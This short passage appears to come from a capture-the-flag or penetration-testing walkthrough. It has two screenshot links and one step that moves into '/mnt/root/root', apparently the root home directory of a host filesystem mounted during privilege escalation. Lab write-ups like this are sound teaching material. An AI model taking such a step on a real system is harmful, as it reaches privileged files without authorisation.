<img src="https://imgur.com/B7SCXeZ.png"/>

Then navigate to `/mnt/root/root`

<img src="https://imgur.com/ppThxx6.png"/>